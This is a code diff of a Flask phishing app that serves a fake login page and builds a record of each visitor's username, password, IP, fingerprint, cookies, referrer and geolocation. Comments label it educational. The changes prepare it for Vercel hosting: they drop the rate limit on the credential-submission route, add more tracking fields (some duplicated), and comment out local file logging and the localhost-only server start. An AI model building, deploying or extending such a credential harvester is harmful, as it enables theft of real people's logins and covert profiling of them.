@@ -277,6 +277,31 @@ def background_analysis(session_id, captured_data):
     except Exception as e:
         logger.error(f"Error in background analysis: {e}")
 
+
+def update_statistics(data):
+    """Update global statistics (in-memory, ephemeral on Vercel)"""
+    try:
+        stats["total_submissions"] += 1
+        ip = data.get("client_info", {}).get("ip_address")
+        if ip:
+            stats["unique_ips"].add(ip)
+
+        browser = data.get("client_info", {}).get("browser", "Unknown")
+        stats["browsers"][browser] = stats["browsers"].get(browser, 0) + 1
+
+        os_info = data.get("client_info", {}).get("operating_system", "Unknown")
+        stats["operating_systems"][os_info] = stats["operating_systems"].get(os_info, 0) + 1
+
+        country = data.get("client_info", {}).get("geolocation", {}).get("country", "Unknown")
+        stats["countries"][country] = stats["countries"].get(country, 0) + 1
+
+        # --- Vercel Change: Remove saving stats to file ---
+        # with open(os.path.join(ANALYTICS_DIR, 'statistics.json'), 'w') as f: ...
+        logger.info("In-memory statistics updated.")
+    except Exception as e:
+        logger.error(f"Error updating statistics: {e}")
+
+
 @app.route('/')
 @rate_limit(max_requests=10, window=60)
 def login_page():
@@ -299,7 +324,7 @@ def login_page():
     return render_template('login.html')
 
 @app.route('/submit_login', methods=['POST'])
-@rate_limit(max_requests=5, window=60)
+# @rate_limit(max_requests=5, window=60)
 def submit_login():
     """Handles the submitted login form data."""
     if request.method == 'POST':
@@ -362,6 +387,7 @@ def submit_login():
             "memory_usage": psutil.virtual_memory().percent
         }
         
+        
         # Create comprehensive data object
         captured_data = {
             "timestamp": timestamp,
@@ -393,7 +419,19 @@ def submit_login():
                 "session_token": session_token,
                 "first_visit": first_visit,
                 "time_on_page": time_on_page,
-                "geolocation": geolocation
+                "geolocation": geolocation,
+                "fingerprint": fingerprint,
+                "referrer": referrer,
+                "referrer_domain": urlparse(referrer).netloc if referrer != 'Unknown' else 'Unknown',
+                "origin": origin,
+                "host": host,
+                "accept_language": accept_language,
+                "accept_encoding": accept_encoding,
+                "do_not_track": dnt,
+                "cookies": cookies,
+                "session_token": session_token,
+                "first_visit": first_visit,
+                "time_on_page": time_on_page
             },
             "server_info": server_info,
             "form_data": dict(request.form),
@@ -419,53 +457,53 @@ def submit_login():
         # This simulates capturing credentials.
         # Saving to a plain text file is INSECURE.
         # NEVER DO THIS IN A REAL APPLICATION OR WITH REAL DATA.
-        try:
-            # Save to traditional log file
-            with open(LOG_FILE, 'a') as f:
-                f.write(f"Timestamp: {timestamp}\n")
-                f.write(f"Session ID: {session_id}\n")
-                f.write(f"Username: {username}\n")
-                f.write(f"Password: {password}\n")
-                f.write(f"IP Address: {ip_address}\n")
-                f.write(f"Browser: {browser}\n")
-                f.write(f"OS: {os_info}\n")
-                f.write(f"Country: {geolocation.get('country', 'Unknown')}\n")
-                f.write(f"City: {geolocation.get('city', 'Unknown')}\n")
-                f.write("---\n")
+        # try:
+        #     # Save to traditional log file
+        #     with open(LOG_FILE, 'a') as f:
+        #         f.write(f"Timestamp: {timestamp}\n")
+        #         f.write(f"Session ID: {session_id}\n")
+        #         f.write(f"Username: {username}\n")
+        #         f.write(f"Password: {password}\n")
+        #         f.write(f"IP Address: {ip_address}\n")
+        #         f.write(f"Browser: {browser}\n")
+        #         f.write(f"OS: {os_info}\n")
+        #         f.write(f"Country: {geolocation.get('country', 'Unknown')}\n")
+        #         f.write(f"City: {geolocation.get('city', 'Unknown')}\n")
+        #         f.write("---\n")
             
-            # Save detailed JSON data
-            json_file = os.path.join(SESSION_DIR, f"session_{session_id}.json")
-            with open(json_file, 'w') as f:
-                json.dump(captured_data, f, indent=2)
+        #     # Save detailed JSON data
+        #     json_file = os.path.join(SESSION_DIR, f"session_{session_id}.json")
+        #     with open(json_file, 'w') as f:
+        #         json.dump(captured_data, f, indent=2)
             
-            # Save IP-specific data for correlation
-            ip_file = os.path.join(IP_DIR, f"ip_{ip_address.replace('.', '_')}.json")
-            ip_data = []
-            if os.path.exists(ip_file):
-                with open(ip_file, 'r') as f:
-                    ip_data = json.load(f)
+        #     # Save IP-specific data for correlation
+        #     ip_file = os.path.join(IP_DIR, f"ip_{ip_address.replace('.', '_')}.json")
+        #     ip_data = []
+        #     if os.path.exists(ip_file):
+        #         with open(ip_file, 'r') as f:
+        #             ip_data = json.load(f)
             
-            ip_data.append({
-                "timestamp": timestamp,
-                "session_id": session_id,
-                "username": username,
-                "fingerprint": fingerprint
-            })
+        #     ip_data.append({
+        #         "timestamp": timestamp,
+        #         "session_id": session_id,
+        #         "username": username,
+        #         "fingerprint": fingerprint
+        #     })
             
-            with open(ip_file, 'w') as f:
-                json.dump(ip_data, f, indent=2)
+        #     with open(ip_file, 'w') as f:
+        #         json.dump(ip_data, f, indent=2)
             
-            # Update statistics
-            update_statistics(captured_data)
+        #     # Update statistics
+        #     update_statistics(captured_data)
             
-            # Start background analysis
-            threading.Thread(
-                target=background_analysis,
-                args=(session_id, captured_data)
-            ).start()
+        #     # Start background analysis
+        #     threading.Thread(
+        #         target=background_analysis,
+        #         args=(session_id, captured_data)
+        #     ).start()
                 
-        except Exception as e:
-            logger.error(f"Error writing to log file: {e}")
+        # except Exception as e:
+        #     logger.error(f"Error writing to log file: {e}")
         # --- END DANGER ZONE ---
 
         # Redirect to a success/decoy page after submission.
@@ -513,47 +551,47 @@ def api_stats():
         logger.error(f"Error in stats API: {e}")
         return jsonify({"status": "error", "message": str(e)})
 
-@app.route('/api/sessions/<session_id>', methods=['GET'])
-@rate_limit(max_requests=3, window=60)
-def api_session_details(session_id):
-    """Retrieve details for a specific session"""
-    try:
-        # Validate session_id format to prevent directory traversal
-        if not re.match(r'^[a-f0-9\-]+$', session_id):
-            return jsonify({"status": "error", "message": "Invalid session ID format"}), 400
+# @app.route('/api/sessions/<session_id>', methods=['GET'])
+# @rate_limit(max_requests=3, window=60)
+# def api_session_details(session_id):
+#     """Retrieve details for a specific session"""
+#     try:
+#         # Validate session_id format to prevent directory traversal
+#         if not re.match(r'^[a-f0-9\-]+$', session_id):
+#             return jsonify({"status": "error", "message": "Invalid session ID format"}), 400
             
-        session_file = os.path.join(SESSION_DIR, f"session_{session_id}.json")
-        analysis_file = os.path.join(ANALYTICS_DIR, f"analysis_{session_id}.json")
+#         session_file = os.path.join(SESSION_DIR, f"session_{session_id}.json")
+#         analysis_file = os.path.join(ANALYTICS_DIR, f"analysis_{session_id}.json")
         
-        if not os.path.exists(session_file):
-            return jsonify({"status": "error", "message": "Session not found"}), 404
+#         if not os.path.exists(session_file):
+#             return jsonify({"status": "error", "message": "Session not found"}), 404
             
-        with open(session_file, 'r') as f:
-            session_data = json.load(f)
+#         with open(session_file, 'r') as f:
+#             session_data = json.load(f)
             
-        result = {"session_data": session_data}
+#         result = {"session_data": session_data}
         
-        # Add analysis if available
-        if os.path.exists(analysis_file):
-            with open(analysis_file, 'r') as f:
-                result["analysis"] = json.load(f)
+#         # Add analysis if available
+#         if os.path.exists(analysis_file):
+#             with open(analysis_file, 'r') as f:
+#                 result["analysis"] = json.load(f)
                 
-        return jsonify({"status": "success", "data": result})
-    except Exception as e:
-        logger.error(f"Error retrieving session details: {e}")
-        return jsonify({"status": "error", "message": str(e)})
+#         return jsonify({"status": "success", "data": result})
+#     except Exception as e:
+#         logger.error(f"Error retrieving session details: {e}")
+#         return jsonify({"status": "error", "message": str(e)})
 
-if __name__ == '__main__':
-    # Runs the Flask development server.
-    # Debug=True provides helpful error messages but should be OFF
-    # in any non-development environment.
-    # Host='0.0.0.0' makes it accessible on your local network (use with caution).
-    # Host='127.0.0.1' (default) keeps it strictly on your machine.
-    logger.info("--- Starting Flask Server ---")
-    logger.info("WARNING: EDUCATIONAL USE ONLY.")
-    logger.info("Access the fake login page at http://127.0.0.1:5000/")
-    try:
-        app.run(host='127.0.0.1', port=5000, debug=True)
-    finally:
-        # Close the GeoIP reader
-        geo_reader.close()
+# if __name__ == '__main__':
+#     # Runs the Flask development server.
+#     # Debug=True provides helpful error messages but should be OFF
+#     # in any non-development environment.
+#     # Host='0.0.0.0' makes it accessible on your local network (use with caution).
+#     # Host='127.0.0.1' (default) keeps it strictly on your machine.
+#     logger.info("--- Starting Flask Server ---")
+#     logger.info("WARNING: EDUCATIONAL USE ONLY.")
+#     logger.info("Access the fake login page at http://127.0.0.1:5000/")
+#     try:
+#         app.run(host='127.0.0.1', port=5000, debug=True)
+#     finally:
+#         # Close the GeoIP reader
+#         geo_reader.close()
